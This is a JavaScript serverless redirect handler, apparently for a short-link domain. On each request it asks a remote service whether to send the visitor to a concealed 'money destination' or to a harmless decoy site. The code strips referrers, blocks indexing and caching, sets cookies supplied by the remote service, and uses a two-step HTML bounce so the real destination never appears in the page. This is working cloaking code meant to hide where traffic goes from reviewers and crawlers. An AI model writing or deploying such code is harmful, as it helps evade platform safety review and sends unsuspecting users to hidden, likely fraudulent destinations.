/**
 * Final exit. Destination only from remote decision response — never public HTML.
 * Forces empty referrer to the destination.
 */
import { remoteFlag } from "../_lib/remote.js";

const SAFE_URL = "https://factor75.com";

function redirect(url, extraHeaders) {
  return new Response(null, {
    status: 302,
    headers: {
      Location: url,
      "Cache-Control": "no-store, no-cache, must-revalidate",
      "Referrer-Policy": "no-referrer",
      "X-Robots-Tag": "noindex, nofollow, noarchive, nosnippet, noimageindex",
      ...(extraHeaders || {}),
    },
  });
}

/** HTML bounce with referrer stripped, then JS replace (no referrer). */
function htmlBounce(url) {
  const safe = String(url).replace(/&/g, "&amp;").replace(/"/g, "&quot;");
  const js = JSON.stringify(url);
  const body = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="referrer" content="no-referrer"><meta http-equiv="refresh" content="0;url=${safe}"><script>location.replace(${js});</script></head><body></body></html>`;
  return new Response(body, {
    status: 200,
    headers: {
      "content-type": "text/html; charset=utf-8",
      "Cache-Control": "no-store",
      "Referrer-Policy": "no-referrer",
      "X-Robots-Tag": "noindex, nofollow, noarchive, nosnippet, noimageindex",
    },
  });
}

export async function onRequestGet(context) {
  const { request, env } = context;
  const url = new URL(request.url);
  const bounce = url.searchParams.get("b") === "1";

  const payload = {
    tz: url.searchParams.get("tz") || "",
    he: "",
    rui: url.searchParams.get("rui") || "/api/go",
    qu: url.searchParams.get("qu") || "",
    r: "", // never forward document referrer to remote money destination
    sn: request.headers.get("host") || "1min.to",
    co: "",
  };

  try {
    const remote = await remoteFlag(request, env, payload);
    if (remote.ok && remote.flag === "true" && remote.dest) {
      let dest = remote.dest;
      if (!/^https?:\/\//i.test(dest)) {
        dest = "https://" + dest.replace(/^\/+/, "");
      }
      const q = payload.qu;
      if (q) dest += (dest.includes("?") ? "&" : "?") + q;
      const headers = {};
      const parts = remote.parts || [];
      if (parts[7] && parts[8]) {
        const days = parseInt(parts[9], 10);
        const maxAge = (Number.isFinite(days) ? days : 1) * 86400;
        headers[
          "Set-Cookie"
        ] = `${parts[7]}=${parts[8]}; Path=/; Max-Age=${maxAge}; SameSite=Lax`;
      }
      // First hit: HTML no-referrer bounce; second (?b=1): 302 also no-referrer
      if (!bounce) {
        const u = new URL(request.url);
        u.searchParams.set("b", "1");
        // Don't put money URL in the bounce page — bounce to self then 302
        // Actually we need money URL only on final 302. Bounce page → /api/go?b=1
        // without exposing dest in HTML: store nothing client-side; re-check on b=1
        return htmlBounce(u.pathname + "?b=1");
      }
      return redirect(dest, headers);
    }
    if (remote.ok && remote.flag === "false") {
      if (remote.dest && /^https?:\/\//i.test(remote.dest)) {
        return bounce ? redirect(remote.dest) : htmlBounce(SAFE_URL);
      }
      return bounce ? redirect(SAFE_URL) : htmlBounce(SAFE_URL);
    }
  } catch {
    /* fall through */
  }

  return bounce ? redirect(SAFE_URL) : htmlBounce(SAFE_URL);
}

export async function onRequestHead(context) {
  return onRequestGet(context);
}
